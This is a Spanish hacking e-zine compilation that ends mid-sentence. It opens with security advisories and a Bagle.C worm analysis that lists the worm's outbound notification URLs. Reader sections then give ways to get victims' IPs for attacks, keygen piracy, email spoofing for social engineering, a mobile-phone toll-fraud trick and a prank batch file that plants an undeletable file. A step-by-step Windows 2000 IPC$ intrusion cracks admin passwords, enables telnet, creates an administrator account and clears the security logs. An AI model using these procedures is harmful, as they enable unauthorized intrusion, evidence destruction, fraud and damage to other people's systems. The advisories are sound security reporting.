Microsoft Windows Media Player 9 Series for Windows 2000
Microsoft Windows Media Player 9 Series for Windows Millennium Edition
Microsoft Windows Media Player 9 Series for Windows Server 2003
Microsoft Windows Media Player for Windows XP Home Edition
Microsoft Windows Media Player for Windows XP Professional
Microsoft Windows Media Player 7.1
Microsoft Windows Media Player 6.4



*Escalada de privilegios en función del API de Microsoft Windows XP

Se han detectado diversas vulnerabilidades en una función nativa del API 
(Application Program Interface) del núcleo de Windows XP que permitiría 
a un usuario con el privilegio SeDebugPrivilege ejecutar código en modo 
kernel, además de poder leer y escribir de cualquier dirección de 
memoria, incluyendo la ocupada por el kernel.

El privilegio SeDebugPrivilege permite cambiar el flujo de ejecución de 
cualquier proceso o matarlo (incluyendo los subsistemas de seguridad o 
cualquier servidor RPC).

La función ZwSystemDebugControl(), exportada de ntdll.dll, llama a una 
función del sistema llamada NtSystemDebugControl(), que es ejecutada 
en modo kernel, y que se creó para ser utilizada por depuradores con 
el privilegio SeDebugPrivilege.

La primera vulnerabilidad permite modificar el registro MSR 
(Model-Specific Register) IA32_SYSENTER_EIP para apuntar al código 
deseado y que posteriormente se ejecute con el control total del 
procesador.

La segunda permite modificar una entrada IDT (Interrupt Dispatch Table) 
con un puntero hacia el código deseado y ejecutar una instrucción INT n 
(interrupción del sistema). Un problema de comprobación de una 
estructura implicada en el proceso permite la escritura en memoria 
de kernel.

La tercera es similar a la anterior, pero utiliza las sub-funciones 
DebugSysReadBusData/DebugSysWriteBusData para modificar el IDT.

La cuarta aprovecha que dado que el programa en modo usuario tiene 
acceso directo a hardware, también puede leer y escribir memoria del 
kernel con la ayuda de hardware que tenga acceso a la RAM del 
procesador. Es un proceso similar al segundo y tercero, pero más 
complejo.

A efectos prácticos, un usuario con el privilegio 
anteriormente nombrado podría ejecutar código arbitrario 
como si fuera del kernel, además de leer y escribir cualquier 
dirección accesible por el mismo.
El programa podría hacer cualquier cosa que el núcleo pueda 
realizar, como reprogramar el hardware del sistema, como la 
BIOS, o parchear el kernel en memoria. 
Hay que tener en cuenta que para explotar este problema se 
requiere el privilegio SeDebugPrivilege, normalmente dado 
sólo a administradores, por lo que el nivel de riesgo es 
reducido. 
La posesión de este privilegio es suficiente para comprometer 
el sistema por su diseño intrínseco.

Como medida sencilla de precaución, se recomienda conceder dicho 
privilegio sólo a usuarios de confianza.

Se tiene constancia de la existencia de códigos de prueba 
de concepto que aprovechan este problema.



*Vulnerabilidad en ZoneAlarm por error en tratamiento de SMTP

Se ha descubierto una vulnerabilidad en determinadas versiones de 
ZoneAlarm, ZoneAlarm Pro, ZoneAlarm Plus y el cliente de Zone Labs 
Integrity. Dicha vulnerabilidad se debe a la falta de comprobación de 
un búfer utilizado en el procesamiento del protocolo SMTP (Simple Mail 
Transfer Protocol). Esta falta de comprobación puede aprovecharse para 
provocar un desbordamiento de búfer. Para poder explotar esta 
vulnerabilidad sin la ayuda del usuario, el sistema debe estar 
funcionando como servidor SMTP. 

ZoneAlarm es un clásico de los firewall personales para entornos Windows 
que principalmente realiza dos funciones: evitar el acceso no autorizado 
desde el exterior hacia el ordenador donde está instalado el cortafuegos 
e identificar que aplicaciones acceden a recursos externos. La compañía 
ZoneLabs no recomienda usar sus productos de seguridad orientada a 
cliente en la tarea de proteger servidores.

La explotación con éxito de la vulnerabilidad (descubierta por eEye 
Digital Security) puede provocar el cese de procesamiento del tráfico del 
firewall, la ejecución de código arbitrario o la escalada de privilegios.

Para poder explotar el problema hace falta que se presente alguna de 
estas situaciones:
* Un programa ha de estar escuchando en el puerto 25/TCP del sistema. 
Esta condición suele darse solo en máquinas con servidores de este 
protocolo, ya que usan ese puerto por defecto.
* Un programa malicioso corriendo en el sistema protegido podría 
provocar un desbordamiento de búfer y realizar una escalada de 
privilegios si el administrador le ha dado permisos para acceder a la 
red. En cualquiera de los casos, el programa que pida acceso a la red 
ha de ser aprobado por el usuario en la política de control de 
programas.

Zone Labs recomienda a los usuarios afectados que actualicen su software 
a la mayor brevedad posible. Las versiones afectadas son la 4.0 o 
superior de los productos antes mencionados, ya que las anteriores no 
reproducen el problema. Los productos Integrity Server e Integrity 
Clientless tampoco se ven afectados por la vulnerabilidad.

- Para ZoneAlarm, ZoneAlarm Plus y ZoneAlarm Pro: se recomienda 
actualizar a la versión 4.5.538.001. Para realizar este proceso, siga 
los siguientes pasos:
1. Seleccionar Overview -> Preferences
2. En el área de Check for Updates, elegir el tipo de actualización:
a. Automatica: el programa notifica automáticamente cuando hay una 
actualización disponible.
b. Manual: usted mismo comprueba la barra de estados para decidir sobre 
la actualización. Para provocar una comprobación de forma inmediata, 
pulse 'Check for Update'.
- Para Integrity 4.0: se recomienda actualizar el cliente a la versión 
4.0.146.046.
- Para Integrity 4.5: se recomienda actualizar el cliente a la versión 
4.5.085




*Acceso no autorizado y denegación de servicio en dispositivos ONS de Cisco

Se han descubierto diversas vulnerabilidades en los dispositivos ONS 
15327, 15454, 15454 SDH y 15600 de Cisco. Un usuario remoto puede 
subir información a la tarjeta controladora o reiniciarla. 

Se ha descubierto que un usuario remoto puede conectarse al servicio 
TFTP en el puerto 69 de UPD y ejecutar comandos GET y PUT. Se podría 
así descargar los archivos de sistema en el TCC activo en los 
directorios /flash0 o /flash1. Se podría provocar una denegación de 
servicio subiendo archivos de sistema ONS corruptos a la tarjeta 
controladora. 

Cisco ha asignado a esta vulnerabilidad el identificador CSCec17308 
para los dispositivos ONS 15327, ONS 15454 y ONS 15454 SDH mientras 
que el identificador es el CSCec19124 para el ONS 15600. 

Se ha descubierto también que un usuario remoto puede conectar con el 
puerto TCP 1080 y evitar enviar el último ACK de la comunicación para 
provocar una denegación de servicio en los dispositivos ONS 15327, ONS 
15454 y ONS 15454 SDH, ya que provocará la reinicialización de dichos 
dispositivos. En los ONS 15454, ONS 15327, y ONS 15454 SDH, el trafico 
caerá temporalmente de los canales de datos síncronos mientras las 
tarjetas de control activa y en espera están reiniciandose. 

También se ha detectado que un usuario remoto puede conectarse al 
puerto telnet y acceder a la cuenta de superusuario que ha sido 
bloqueada, desactivada o suspendida con sólo usar la clave previamente 
configurada para la cuenta. 

La compañía ha informado que los dispositivos ONS series 15800, ONS 
series 15500 Extended Service Platform, ONS 15302, ONS 15305, ONS 
series 15200 metro DWDM systems, y ONS series 15190 no están afectados 
por este problema. También informa que los ONS 15327 funcionando con 
el ONS Release 1.x(x) y 3.x(x), y los ONS 15454 con ONS Releases 
2.x(x) y 3.x(x) tampoco están afectados. 

Los Cisco ONS Release 4.6(0) no se ven afectados por estas 
vulnerabilidades, pero el fabricante recomienda actualizar al Release 
4.6(1). 

Los procedimientos de actualización para los ONS 15327, 15454 y 15600 
están disponibles en las siguientes URLs (respectivamente): 
<http://www.cisco.com/univercd/cc/td/doc/product/ong/15327/327doc41/index.htm> 
<http://www.cisco.com/univercd/cc/td/doc/product/ong/15400/r46docs/index.htm>
<http://cisco.com/univercd/cc/td/doc/product/ong/15600/index.htm>



*Bagle.C, nueva variante del gusano comienza su propagación

A última hora del viernes 27 hemos podido detectar en Hispasec la
propagación por e-mail de la que sería la tercera variante del gusano
Bagle, que nos ha llegado en un correo electrónico como archivo
adjunto .ZIP de unos 16KB. Bagle.C, que ha sido programado para que
cese su propagación después del día 14 de marzo de 2004, abre en los
sistemas infectados una puerta trasera en el puerto TCP 2475 que
podría permitir a un atacante controlar el equipo de forma remota.

Aunque aun es pronto para conocer indicadores de propagación e
infección, algunas casas antivirus ya lo sitúan como alerta de nivel
medio por su potencial y/o basándose en los ratios conseguidos por
sus predecesores. En una próxima entrega podremos ofrecer la tabla
completa de los tiempos de reacción de las diferentes casas antivirus
en proporcionar la actualización para Bagle.C a sus clientes, según
el sistema de monitorización 24hx7d del laboratorio de Hispasec.


Así llega Bagle.C

El e-mail en el que Bagle.C se adjunta nos llega con la dirección
de remite falseada, con el cuerpo del mensaje vacío, sin ningún
texto, y el asunto en inglés puede ser uno de los siguientes:

Accounts department 
Ahtung! 
Camila 
Daily activity report 
Flayers among us 
Freedom for everyone 
From Hair-cutter 
From me 
Greet the day 
Hardware devices price-list 
Hello my friend 
Hi! 
Jenny 
Jessica 
Looking for the report 
Maria 
Melissa 
Monthly incomings summary 
New Price-list 
Price 
Price list 
Pricelist 
Price-list 
Proclivity to servitude 
Registration confirmation 
The account 
The employee 
The summary 
USA government abolishes the capital punishment 
Weekly activity report 
Well... 
You are dismissed 
You really love me? he he 

El archivo adjunto, donde viaja Bable.C, tiene un nombre variable
formado con caracteres al azar y extensión .ZIP, y su tamaño es de
unos 16KB. En su interior se encuentra un ejecutable .EXE comprimido
con UPX de 15.872 bytes, que si lo visualizamos desde el explorador
de Windows aparecerá con el icono de las hojas de cálculo Excel, en
un intento más de engañar al usuario.


La infección del sistema

Cuando se ejecuta el gusano, en primer lugar abre el bloc de notas de
Windows con una hoja en blanco, si bien de forma oculta al usuario
comienza la infección del sistema, copiando en el directorio de
sistema de Windows (por ejemplo WINNT\SYSTEM) los siguientes archivos:

readme.exe 
onde.exe 
doc.exe
readme.exeopen 

A continuación introduce la siguiente entrada en el registro de
Windows para asegurarse su ejecución en cada inicio de sistema:

HKEY_CURRENT_USER\Software\Microsoft\Windows\
CurrentVersion\Run "gouday.exe" = %System%\readme.exe

Adicionalmente añade las siguientes entradas, que incluye el puerto
donde abre la puerta trasera y un identificador del sistema infectado:

HKEY_CURRENT_USER\Software\DateTime2 "frun" 
HKEY_CURRENT_USER\Software\DateTime2 "uid" 
HKEY_CURRENT_USER\Software\DateTime2 "port" 


Propagación

Bagle.C incorpora su propio motor SMTP para enviarse a otros sistemas,
y recopila las direcciones de correo electrónico del ordenador
infectado buscando en los archivos con extensión .ADB, .ASP, .CFG, 
.DBX, .EML, .HTM, .HTML, .MDX, .MMF, .NCH, .ODS, .PHP, .PL, .SHT, 
.TXT, .WAB. 

El gusano evita enviarse a las direcciones que contenga algunas de las
siguientes cadenas:

.ch
@avp. 
@hotmail.com 
@microsoft 
@msn.com 
local 
noreply 
postmaster@ 
root@ 


Evitando ser detectado

Bagle.C intenta evitar ser detectado, desactivando varios programas
de seguridad, como antivirus, firewalls o sistemas de actualización.
Para ello intenta finalizar los siguientes procesos si se encuentran
en la memoria del sistema infectado:

NUPGRADE.EXE 
ATUPDATER.EXE 
AUPDATE.EXE 
AUTOTRACE.EXE 
AUTOUPDATE.EXE 
AVLTMAIN.EXE 
MCUPDATE.EXE 
AVPUPD.EXE 
AVWUPD32.EXE 
AVXQUAR.EXE 
CFIAUDIT.EXE 
DRWEBUPW.EXE 
ICSSUPPNT.EXE 
AUTODOWN.EXE 
ICSUPP95.EXE 
LUALL.EXE 
OUTPOST.EXE 
UPDATE.EXE 


Puerta trasera

Bagle.C abre en los sistemas infectados una puerta trasera en el
puerto TCP 2745, que permitiría a un atacante externo subir y
ejecutar programas, de forma que puede controlar el sistema de
forma remota.

Parece ser que el creador del gusano ha intentado utilizar un sistema
de notificación para conocer las direcciones IPs de los sistemas
infectados y así intentar utilizar esta puerta trasera. Se basa en
que el gusano realiza peticiones GET a las siguientes direcciones:

<http://permail.uni-muenster.de/scr.php> 
<http://www.songtext.net/de/scr.php> 
<http://www.sportscheck.de/scr.php> 

Como parámetros pasa el puerto TCP abierto, el número "uid" que
almacena en una de las entradas del registro, y también quedaría
registrado en esos scripts la dirección IP desde la cual se realiza
la petición, datos más que suficientes para que el creador del
gusano intente utilizar la puerta trasera para todo tipo de fines.


Con fecha de caducidad en su rutina de propagación

Bagle.C ha sido programado para que cese su rutina de propagación a
partir del 14 de marzo, si bien la puerta trasera de los sistemas
infectados seguirá abierta mientras que no se elimine el gusano de
los equipos infectados.

Recordemos que su anterior variante, Bagle.B, dejó de propagarse el
25 de febrero, y apenas dos días después ha dado comienzo la
distribución de Bagle.C.


Prevención 

Como siempre la regla de oro a seguir es no abrir o ejecutar archivos 
potencialmente peligrosos, sobre todo si no hemos demandado su envío. 
Adicionalmente, contar con soluciones antivirus correctamente 
instaladas y puntualmente actualizadas. También resulta útil seguir 
los foros de seguridad o listas como "una-al-día", para estar al 
tanto de las últimas amenazas que nos pueden afectar.





**************************
--------------------------
COMPILADO
--------------------------
                     el-guru
**************************


Estos son textos compilados que en algun día, no recuerdo
cuando :P, me mando mi amigo el-guru.
Lo bueno viene en envase chicho XD


[°±°±²±°±²±°±²±°²±°±°±²±°±[Intro a Proxys]°±°±²±°±²±°±²±°²±°±°±²±°±]

  Un Proxy es una forma de engañar a servidor ya que los Proxy sirven
 para proteger la identidad de tu maquina, el servidor cree que te estas
 conectando desde el Proxy en vez de tu propio ordenador.
 
 NOTA: Los proxys para conectar a una red en mIRC son llamados Socks

[°±°±²±°±²±°±²±°²±°±°±²±°±[Shell]°±°±²±°±²±°±²±°²±°±°±²±°±]

  Bueno una cuenta Shell para aquellos que no saben es una cuenta en
 una maquina con algún tipo de UNIX a la que se le pueden conectar
 usuarios remotamente mediante Internet, algunas de las paginas donde
 se dan este tipo de cuentas gratis son en:
 http://www.cyberspace.org ó en http://sdf.lonestar.org

  Si conectas directamente desde Telnet las direcciones que deberías
 de usar son cyberspace.org y sdf.lonestar.org por el puerto 23 como
 siempre.

  Bueno con una cuenta Shell puedes hacer infinidad de cosas eso claro
 que te lo dejo a tu imaginación y ademas cada cosa que hagas no
 quedará registrada tu IP si no la de la maquina de la cuenta Shell xD~


[±°±²±°±²±°±²±°²±°±°±²±°±[Seguridad en Windos]±°±²±°±²±°±²±°²±°±°±²±°±]

  Siempre tienes que recordar que teniendo el S.O. Windows tu maquina
 nunca estará protegida a un 100% entonces para proteger tu ordenador
 de Windows hay que tener unos programas llamados "FireWalls" que en
 español lo tradujeron como "Corta Fuegos"

  A grandes rasgos podríamos decir que un Firewall es un programa de
 seguridad que crea una pared para evitar intrusos en nuestro ordenador
 y tanto en la red local como en la red externa (Internet).

Te doy algunas de las webs donde podras encontrarlos:

Zone Alarm -               http://www.zonelabs.com     Muy bueno(lo uso)
Tiny personal Firewall -   http://www.tinysoftware.com Bueno
Sygate Personal Firewall - http://www.sygate.com       Bueno
Black Ice -                http://www.blackice.com     Exelente...

Nota: Cuando los bajes por tiempo limitado dirigete a Altavista para
buscar un KeyGen para que salga gratis (jejeje a que pinche ratero xD~)


[±°±²±°±²±°±²±°²±°±°±²±°±[Arte de las IP's]±°±²±°±²±°±²±°²±°±°±²±°±]

  Bueno como todos sabemos al tener una IP algunas veces (al ataque
 que tenemos en mente) tenemos un 30% de la situación solucionada y 
 ahora te dire como sacarlas en chat, etc...

IRC:
  Uno de los casos mas difíciles es como Obtener una IP es por el IRC,
 por ejemplo: algunas veces cuando empiezas en esto del Hacking la
 mayoría de los programas para joder (nukes) necesitan el número IP

  Pues bien en aquellas redes "pobres" donde no te dan una IP vitual
 es donde es mas fácil atacar solo tienes que poner este comando en 
 el status: /dsn nick y saldrá la IP de la persona.

  Cuando hay servidores donde te dan una IP virtual ó las encriptan 
 (disfrazan tu IP para no ser descubierta) solo hay una forma de 
 averiguar la IP es mandándole un fichero por DCC y mientras se este
 enviando habres una ventana de MS-DOS y pondrás lo siguiente:
 NETSTAT -A y ahí saldrá la IP de la personaa la que le mandas el
 fichero.

  Bueno una de las dudas que mas hay es: cuando pongo en MS-DOS el
 comando NETSTAT -A salen muchas IPs ¿como se cual es? bueno le mejor
 es que antes de enviar el archivo por DCC habrás MS-DOS y pongas
 NETSTAT -A y veas las IPs que te aparecen y después sin ningún problema
 al ejecutar de nuevo NETSTAT -A

NOTA: Lo mejor es que cuando hagas eso cierres todas las ventanas del 
Internet Explorer y también programas de intercambio de archivos
como WINMX, Kazaa, eDonkey... (programas de intercambio)

E-MAIL:
  
  Si te ha llegado un E-mail y te ha enojado tanto que quieres romperle
 los huebos a patadas al que te lo mando, pues hay una forma de sacar
 su IP (tu sabes lo que harás con ella) los único que tienes que
 hacer es: botón derecho sobre el texto ó mensaje y después escoges la
 opción de PROPIEDADES, te aparecerá un ventana que contiene General
 y Detalles y tienes que escoger Detalles.

  Saldrán enseguida sus datos de la persona:
 Received from: [200.56.120.130] by aol net mx
NOTA: La IP salió ya, es así de fácil!!! es: ===>200.53.64.3<===

MSN Messenger de Mierdasoft:

  Esta forma de sacar un IP por el MSN Messenger es muy parecida a
 la forma de sacarla a través del un Chat solo tienes que mandarle un
 fichero a la persona por medio del Messenger en la opción:
 MANDAR FICHERO cuando se este enviando el archivo habré un ventana
 de MS-DOS y pon el comando NETSTAT -A ahí aparecerá su IP 

NOTA: Incluso verciones nuevas permiten esto, la forma que estoy 
enseñando es la manual, pero en verdad ya hay programas para ello.

IP DE UN DOMINIO:

  Pues bien un Dominio es un nombre designado a una IP por
 ejemplo: www.google.com ó www.terra.com.mx       
  
  Para averiguar la IP necesitamos utilizar el comando Ping, habrimos
 un ventana de MS-DOS y después escribimos ping -a www.google.com y nos
 aparecerán unos números como puedes ver la IP aparece enseguida del
 Dominio.


[±°±²±°±²±°±²±°²±°±°±²±°±[Hack para Novatos]±°±²±°±²±°±²±°²±°±°±²±°±]

  Este es un pequeño repaso a los métodos usados en el Hacking y el
 cracking para novatos y newbies.


CABALLOS DE TROYA

  Consiste en introducir dentro de un programa una rutina o conjunto de
 instrucciones, por supuesto no autorizadas y que la persona que lo ejecuta
 no conoce, para que dicho programa actua de una forma diferente a como
 estaba previsto (Por ejemplo: Formatear el disco duro, modificar un fichero,
 sacar un mensaje, etc.)


SUPERZAPPING

  Se denomina superzapping al uso no autorizado de un programa editor de
 ficheros para alterar, borrar, copiar, insertar o utilizar en cualquier
 forma no permitida los datos almacenados en los soportes de un ordenador.
 El nombre proviene de una utilidad llamada SUPERZAP diseñada para
 Mainframes y que permite acceder a cualquier parte del ordenador y
 modificarlo, su equivalente en un PC serian las Pctools o el Norton Disk
 Editor.


PUERTAS FALSAS

  Es una practica acostumbrada en el desarrollo de aplicaciones complejas que
 los programadores introduzcan interrupciones en la lógica de los programas
 para chequear la ejecución, producir salidas de control, etc. con objeto de
 producir un atajo para ir corrigiendo los posibles errores. Lo que ocurre
 es que en la mayoría de los casos cuando el programa se entrega al usuario
 estas rutinas no se eliminan del programa y proveen al hacker de accesos o
 facilidades en su labor si sabe descubrirlas.


BOMBAS LOGICAS

  Este suele ser el procedimiento de sabotaje mas comúnmente utilizado por
 empleados descontentos. Consiste en introducir un programa o rutina que en
 una fecha determinada destruir  o modificara la información, o provocara el
 cuelgue del sistema.


ATAQUES ASINCRONICOS.
  Este es quizá  el procedimiento mas complicado y del que menos casos se a
 tenido conocimiento. Se basa en las características de los grandes sistema
  informáticos para recuperarse de las caídas, para ello periódicamente se
 graban los datos como volcado de memoria, valor de los registros, etc. de
 una forma periódica Si alguien consiguiera hacer caer el sistema y
 modificar dichos ficheros en el momento en que se ponga de nuevo el
 funcionamiento del sistema este continuara con la información facilitada y
 por tanto la información podría ser modificada o cuando menos provocar
 errores.


INGENIERIA SOCIAL

  Básicamente convencer a la gente de que haga lo que en realidad no debería.
 Por ejemplo llamar a un usuario haciéndose pasar por administrador del
 sistema y requerirle la password con alguna excusa convincente.

SIMULACION DE IDENTIDAD

  Básicamente en usar un terminal de un sistema en nombre de otro usuario
 bien por que se conoce su clave, por que abandono el terminal pero no lo
 desconecto y ocupamos su lugar. El termino también es aplicable al uso de
 Tarjetas de Crédito o documentos falsos a nombre de otra persona.


PINCHADO DE LINEAS DE DATOS O SPOOFING

  Similar al pinchado de líneas telefónicas, en este caso el objetivo son los
 sistemas de transmisión de datos (Cable telefónico usado por módem, cableado
 de una red local, fibra óptica, TV por cable) con el fin de monitorizar la
 información que pasa por ese punto y obtener información del sistema.


SIMULACION POR ORDENADOR

  Se define así el uso de la computadora para simular previamente una
 situación y de esta forma determinar las acciones a probar. En el contexto
 del Hacking se refiere a la simulación en la computadora propia del sistema
 a atacar con el fin de elaborar estrategias de acción.


[±°±²±°±²±°±²±°²±°±°±²±°±[Intro a FTP]±°±²±°±²±°±²±°²±°±°±²±°±]


  Bueno para que sepas desde el principio que  es el FTP te daré el
 significado en su abreviatura que es:  File Transfer Protocol o sea Protocolo
 de Transferencia de Ficheros y como podrás observar en el listado de los
 puertos al FTP le corresponde el 21. Este servicio hay que conocerlo muy
 bien ya que además que nos sirve para subir o bajar ficheros también nos puede
 ayuda en nuestros propósitos maliciosos,  por supuesto el Hacking. 
 
  Sino dispones de ningún cliente FTP, el propio Windows lleva incorporado uno,
 el único problema es que no es muy vistoso ya que funciona en modo MS-DOS pero
 es muy versátil y perfecto para nosotros. Para ejecutarlo basta que activemos
 una ventana MS-DOS y en la línea de comandos escribamos FTP y se pondrá en modo
 FTP. Un ejemplo seria esto: 

 ftp: connect <- Escribimos FTP.
 ftp> <- activado el modo FTP
 Si no sabes manejarlo, escribiendo un "?" o "help" saldrán todos los comandos
 disponibles del FTP, como quieres saber para que sirve solo vuelve a leer su
 nombre y ahí te dice todo, en verdad es una forma de subir tus archivos o
 bajarlos de un server y también es muy útil cuando estas haciendo una Web en
 sitios como Geocities, Galeón, Miarroba, etc...


[±°±²±°±²±°±²±°²±°±°±²±°±[Modificar Windows 95,98,Me]±°±²±°±²±°±²±°²±°±°±²±°±]


  Esta técnica no es que sea propia del Hacking ya que solo sirve para cambiar
 la pantalla de inicio o la de finalizar windows. Los logos de Windows tienen
 un formato BMP 320X400 pero están camuflados en ficheros con extensión SYS
 pero siguen siendo realmente BMP'S.

  El logo del principio de Windows (ya sabes el de las nubes) 
  lo podéisencontrar como:

c:\>logo.sys

  Si no encuentras este fichero, entonces lo que tenemos que hacer es crearlo 
 y grabarlo allí mismo y cuando Windows vuelva a reiniciar usara nuestro gráfico
 y si lo volvemos a quitar, usara el de siempre. El logo del final
 (cuando cierra Windows) esta en el directorio Windows y lo podemos encontrar
 como:

c:\Windows>logos.sys

  Lógicamente es obligatorio que los gráficos que queramos sustituir tengan de
 tamaño 320x400 y sean ficheros BMP'S. Conviene que les pongamos el atributo
 de ocultos, que esto se hace con el comando Attrib, por ejemplo:

c:\windows>attrib +h logos.sys <- lo oculta.

c:\windows>attrib -h logos.sys <- lo hace visible.

[±°±²±°±²±°±²±°²±°±°±²±°±[Clonar Mail]±°±²±°±²±°±²±°²±°±°±²±°±]

Clonacion de E-Mails.

  Esta tecnica nos ayuda a clonar E-mails que en lo personal solo lo uso
 para bromear (jejeje), pero puedes usarlo para una verdadera y original
 Ingenieria Social.

  Lo primero que tenemos que hacer es conseguir un E-mail anonimo en
 www.elhacker.net (buena web), ahi tendremos muchos E-mails anonimos pero
 te recomiendo el Xmas2000 aunque es un programa viejo... es muy efectivo
 es un E-MailBomber y un E-mail anonimo en 1 (gran tecnologia jajaja) , 
 despues mira las intrucciones y sigue las clasicas: FROM, TO, MAIL, etc...

 Los SMTP en lista son:

 HOTMAIL: mail.hotmail.com
 YAHOO: smtp.mail.yahoo.com
 MSN HOTMAIL (los que son algunwey@msn.com): smtp.email.msn.com
 MICROSOFT: mail5.microsoft.com
 GEOCITIES: mail.bluelight.com
 PARADIZE: smtp.paradise.net.nz

[±°±²±°±²±°±²±°²±°±°±²±°±[Movi Star Pendejos!!!]±°±²±°±²±°±²±°²±°±°±²±°±]
 
   
  De este texto sobre Phreak en verdad no me hago nadita responsable xD~~~
  
  Movi Star maneja una encriptacion de tarjetas dificil de desencriptarlo
 pero tienen un error de lo mas estupido que cuando hablas no hace la llamada
 y te manda a una contestadora que dice que tu pinche credito se acabo...
 
  Pues a que si tienes un celular pegaso o Movi Star y con tarjeta y ya
 no tienes ni $1 peso de crédito lo puedes solucionar.... pos....
 compra otra maldita targeta babosooooo!!! jajajaja hay el-guru siempre 
 tan chistosito xDDDDDD~~~

  Bueno ahi va llamada gratiss!!! jejeje:    (a que pinche guru tan tranza)

 A)Llama al numero que quieras llamar
 B)Cuando la grabacion entre...  cuelga rápido
 C)Dale llamar (send) de nuevo para que vuelva a llamar al ultimo número
 D)Cuando la grabacion entre... presionas el #2, con esto se brinca un 
 password que es el que genera base de datos interna de Movi Star y listo
 llamada gratisss...

  Este bug (error) se debe a los pendejos de los Programadores jeje!!! que
 parece que no fueron a la escuela los weyes, pero bueno Disfruta tu credito
 jajajajajajaja!!! (el ingenio del mexicano sobre todas las cosas)
 
  Esperamos que cuando leas esto el Bug siga vigente y si te agarran 
 es tu pedo manito =D.





**************************
--------------------------
FALLO EN WIN ME
--------------------------
                     AliretH_K	
**************************



Este error lo descubri en mi asqueroso Windows ME que tengo
en mi casa (si, me da verguenza tenerlo) y ahora estoy
plagado de estos archivitos y lo peor que mi PC no va para
ningún lado, a continuación les presento el texto que he
escrito sobre esto.


Windows ME, con un simple nombre, trae muchos problemas.

Una vez mas nuestro gran Windows, posee un error.
Este error, es un muy simple de ocasionarlo nosotros
mismos, pero es tan molesto, como para no dejar
defragmentar nustro ordenador, o dejar correr el ScanDisk
ya que este, leera un error, y se reiniciara todas las 
veces, sin nunca terminar el proceso.
Esto no solo pasa con los programas de Windows (Defrag de
Windows, o el ScanDisk del mismo) si no que tambíen este
problema, afecta a los usuarios de Norton-SystemWorks
al no dejar usar algunos programas de este mismo.
Este simple error que se genera, al crear un archivo
en el editor de Ms-dos, y guardarlo con el nombre
±_³_¥Þ¿¹
no importa su extención, este simple archivo, te 
generará un error de escritura en el disco, que te 
imposibilitara lo que dije anteriormente.
El Windows no lee este archivo, pero sabe que existe.
No le podras cambiar en nombre, eliminarlo, moverlo,
o modificar sus propiedades, aunque puedes modificarle 
su contenido por cualquiera que sea.
El problema de este archivo, lo ocasiona su nombre
ya que posee carácteres no válidos dentro de Windows ME.
±_³_¥Þ¿¹
Hasta el momento no he encontrado forma alguna
de eliminarlo ni de moverlo.
Tampoco este archivo puede ser tratado, al entrar
en modo prueba de fallos de Windows, ya que reacciona 
de la misma manera.
O sea, que si le queremos jugar una mala pasada a alguna
persona, podemos crear un .BAT con estos comandos, ya 
que creará un archivo con el nombre dañino.


@echo off




echo       _____________________________________________________________
echo       _                                                           _
echo       _                     AliretH_K Hacking                     _
echo       _                       de Argentina                        _
echo       _-----------------------------------------------------------_
echo       _                                                           _
echo       _                       Feliz Año nuevo                     _
echo       _                                                           _
echo       _____________________________________________________________


Copy c:\ > ±_³_¥Þ¿¹

exit


Este .BAT le creará el archivo, con el nombre NO VALIDO
y le ocasionará lo que dijimos anteriormente.

<-No Intentes $uperar a los demá$, $superate a ti MismO->

                                                         AliretH_K


Bueno, ahora conocen la verdad :P



************************************************
------------------------------------------------
Hacking de Sistemas Windows 2000 a través de IPC
------------------------------------------------
                                           DonGato
************************************************


TEMARIO 

1:Buscando Sistemas Win2k. 
2:Conectando a través de IPC$. 
3:Conectando y usando Administración de equipos. 
4.Deshabilitar NTLM 
5: Iniciando el Servidor Telnet. 
6: Creando una cuenta y agregando al grupo de administradores. 
7: Cubriendo tus actos. 
8: Como protegerte de este ataque.



Herramientas que necesitaras: Superscan versión 3.00 
by Foundstone (246kb). 
Disponibles en descargas. 
NetBrute Scanner 1.0.0.7 (247KB). 
Disponible en descargas.
PQWak V1.0 (24KB). 

1 BUSCANDO SISTEMAS WIN2k.

A. Habré SuperScan.

B. Selecciona un rango de IP's.

C. Verifica " Only scan responsive pings ( solo busca 
respuesta a ping)". 

D. Solo busca en los puertos 139 (NetBios) y 1025 
( Blackjack en red).

E. Cuando un sistema responda a cualquiera de los puertos 
139,1025 habré NetBrute y verifica si es accesible me 
diente IPC$.



2 CONECTANDO A TRAVEZ DE IPC$

A. Abre un ventana de DOS.

B. Escribe " net use \\ipaddress\ipc$ "" /user:administrator " 

C. Si te pudiste conectar dirá, " The command was completed successfully 
" EL comando se ha completado satisfactoriamente. 

D. Si dice, “bad username or password”, Corre PQWak.exe 
para romper el password. Entonces quedara algo así;
net use \\ipaddress\ipc$ "password" /user:administrator 

E. Usualmente los usuarios tiene un solo password para todo.
Trata de conectate a c$.



3: CONECTANDOSE Y USADNO EL ADMINISTRADOR DE EQUIPOS 
(se encuentra en el panel de control herramientas administrativas) 

A. Abrir el administrador de equipos.

B. En el Menú“Action”, dar “Conectar a 
otra computadora ” 

C. Dar la IP.



4. DESABILITAR NTLM 

A. Abrir “regedit” 

B. E n Menú archivo Conectar a registro de red y abrir:
HKEY_LOCAL_MACHINE--Software--Microsoft--Telnet Server--1.0—->NTLM 

C. Cambiar el valor (2) a (1) 

D. Esto permitirá que este disponible el login a través de telnet 
con conexiones IPC$ o dominios confiables.



5. INICIANDO EL SERVIDOR TELENET.

A. En el administrador de equipos abrir Servicios y aplicaciones. 

B. En Servicios. 

C. Click derecho en Telnet y abrir propiedades. 

D. Aplicar servicio Automático he iniciar servicio.



6: CREANDO UN CUENTA Y AGREGANDOLA A UN GRUPO. 

A. Abrir una ventana MSDOS escribir : telnet IPaddress 

B. En la ventana dar el usuarios y el pass.Administrator 
( administrador) con no password. o en otro caso el password 
que obtuvimos con PQWak.

C. Para crear una cuenta teclear: net user username password /add 

D. remplazar “Username” and “password” 
con el que queramos.

E. Para agregar la cuenta al dominio: net localgroup administrators 
username /add o net group administrators username /add 



7: CUBRIENDO TUS ACCIONES. 

A. En una ventana de MSDOS da: net use \\ipaddress\ipc$ /delete 

B. Antes de deslogearte de el administrador de Equipo. 
Checa el Security Logs y limpiarlo. :-) 



8: Como proteger tu sistema de este ataque. 

A. Abre Regedit 

B. Haz lo siguiente:: 

C. HKEY_LOCAL_MACHINE--System--CurrentControlSet--Control--Lsa-->restrictanonymous 

D. Cambia el valor de 0 a 1.debe decir 0x00000001(1) 

E. Esto hace deshabilitar el login atrae de IPC$.

F. Siempre útiliza password complicados para la cuenta de administrador.

G. Instala el firewall. <http://www.zonealarm.com/> 




***********************
-----------------------
Carpetas autoejecutables en Windows XP 
-----------------------
                  DonGato
***********************


La gente de malware publicó el 01-01-2004 bajo el asunto 
